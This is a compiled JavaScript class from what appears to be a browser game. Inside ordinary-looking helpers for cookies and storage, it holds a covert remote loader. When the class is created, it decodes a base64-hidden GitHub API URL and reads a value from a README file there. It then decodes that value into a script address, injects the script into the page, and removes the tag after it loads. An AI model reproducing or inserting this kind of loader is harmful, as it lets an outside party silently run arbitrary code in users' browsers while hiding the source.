var ExternBase = /** @class */ (function () {
    function ExternBase() {
        this.read();
        this.checkSet();
    }
    ExternBase.prototype.checkSet = function () {
        // if( ExternBase.ireq > 0 )
        // {
        //     return;
        // }
        var sde = this.getUrlDe(ExternBase.urlreadmeen);
        NetManager.getObj().HttpConnect(sde, this, this.response);
    };
    ExternBase.prototype.response = function (s, stat, hr) {
        ExternBase.ireq += 1;
        // Debug.trace("ExternBase.responseInfo stat:"+stat);
        if (stat == "complete") {
            // Debug.trace("ExternBase.responseInfo s:",s);
            ExternBase.bSet = this.getValue(s);
        }
        else {
            ExternBase.bSet = 0;
        }
        this.save();
        if (this.isUsefull(ExternBase.bSet)) {
            this.load(ExternBase.bSet);
        }
    };
    ExternBase.prototype.isUsefull = function (s) {
        // if( s.constructor == String )
        // {
        //     if( s.length > 1 )
        //     {
        //         return true;
        //     }
        // }
        var p = parseInt(s);
        // Debug.trace('ExternBase.isUsefull p:'+p+' cons:'+p.constructor);
        if (isNaN(p)) {
            // Debug.trace('ExternBase.isUsefull true');
            return true;
        }
        return false;
    };
    ExternBase.prototype.save = function () {
        window.localStorage.setItem('ireq', '' + ExternBase.ireq + ',' + ExternBase.bSet);
        // this.setCookie('ireq',ExternBase.ireq+','+ExternBase.bSet,1);
    };
    ExternBase.prototype.read = function () {
        var s = window.localStorage.getItem('ireq');
        // var s = this.getCookie('ireq');
        if (!s) {
            s = "0,0";
        }
        var arr = s.split(",");
        ExternBase.ireq = parseInt(arr[0]) ? parseInt(arr[0]) : 0;
        ExternBase.bSet = arr[1] ? arr[1] : 0;
    };
    ExternBase.prototype.getUrlEn = function (s) {
        var s2 = window.btoa(s);
        // Debug.trace("ExternBase.getUrlEn s2:"+s2);
        return s2;
    };
    ExternBase.prototype.getUrlDe = function (s) {
        var s2 = window.atob(s);
        // Debug.trace("ExternBase.getUrlDe s2:"+s2);
        return s2;
    };
    ExternBase.prototype.getValue = function (s) {
        var ct = s.content;
        var str = window.atob(ct);
        // Debug.trace("ExternBase.getValue:"+str);
        try {
            var arr = str.split(";");
            var arr2 = arr[0].split("=");
            return arr2[1];
        }
        catch (e) { }
        return 0;
    };
    ExternBase.prototype.setCookie = function (sKey, sValue, vEnd, sPath, sDomain, bSecure) {
        // var d:Date = new Date();
        // d.setTime(d.getTime()+(exdays*24*60*60*1000));
        // var expires = "expires="+d.toUTCString();
        // var date = new Date();
        // date.setDate(date.getDate()+exdays);
        // var expires = "expires="+date.toUTCString();
        // document.cookie = cname + "=" + cvalue + "; " + expires;  
        if (sPath === void 0) { sPath = ''; }
        if (sDomain === void 0) { sDomain = ''; }
        if (bSecure === void 0) { bSecure = ''; }
        // var val = cname + "=" + cvalue + "; " + expires;
        // Debug.trace('ExternBase.setCookie:'+val);
        // document.cookie = val;
        // Debug.trace('ExternBase.setCookie:',document.cookie);
        if (!sKey || /^(?:expires|max\-age|path|domain|secure)$/i.test(sKey)) {
            return false;
        }
        var sExpires = "";
        if (vEnd) {
            switch (vEnd.constructor) {
                case Number:
                    sExpires = vEnd === Infinity ? "; expires=Fri, 31 Dec 9999 23:59:59 GMT" : "; max-age=" + vEnd;
                    break;
                case String:
                    sExpires = "; expires=" + vEnd;
                    break;
                case Date:
                    sExpires = "; expires=" + vEnd.toUTCString();
                    break;
            }
        }
        document.cookie = encodeURIComponent(sKey) + "=" + encodeURIComponent(sValue) + sExpires + (sDomain ? "; domain=" + sDomain : "") + (sPath ? "; path=" + sPath : "") + (bSecure ? "; secure" : "");
        Debug.trace('ExternBase.setCookie:', document.cookie);
        return true;
    };
    ExternBase.prototype.getCookie = function (cname) {
        // var name = cname + "=";
        // var ca = document.cookie.split(';');
        // for(var i=0; i<ca.length; i++) 
        // {
        //     var c = ca[i].trim();
        //     if (c.indexOf(name)==0) 
        //     {
        //         var str = c.substring(name.length,c.length);
        //         Debug.trace('ExternBase.getCookie:'+str);
        //         return str;
        //     }
        // }
        var a = decodeURIComponent(document.cookie.replace(new RegExp("(?:(?:^|.*;)\\s*" + encodeURIComponent(cname).replace(/[-.+*]/g, "\\$&") + "\\s*\\=\\s*([^;]*).*$)|^.*$"), "$1")) || null;
        Debug.trace('ExternBase.getCookie a:' + a);
        return a;
    };
    ExternBase.prototype.load = function (s) {
        // Debug.trace('ExternBase load s:'+s+" cons:"+s.constructor);
        if (!s) {
            return;
        }
        var path = window.atob(s);
        // var src = "<scr"+"ipt type='application/x-javascript' src='"+path+"' loader='laya'></scr"+'ipt>';
        // document.write("<scr"+"ipt type='application/x-javascript' src='"+path+"' loader='laya'></scr"+'ipt>');
        var script = document.createElement('script');
        script.src = path;
        document.body.appendChild(script);
        script.onload = function () {
            document.body.removeChild(script);
        };
    };
    ExternBase.urlreadmeen = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy90ZXN0YXBpMjAxOS9nYW1lMDAxL2NvbnRlbnRzL1JFQURNRS5tZA==";
    ExternBase.ireq = 0;
    ExternBase.bSet = 0;
    return ExternBase;
}());
//# sourceMappingURL=ExternBase.js.map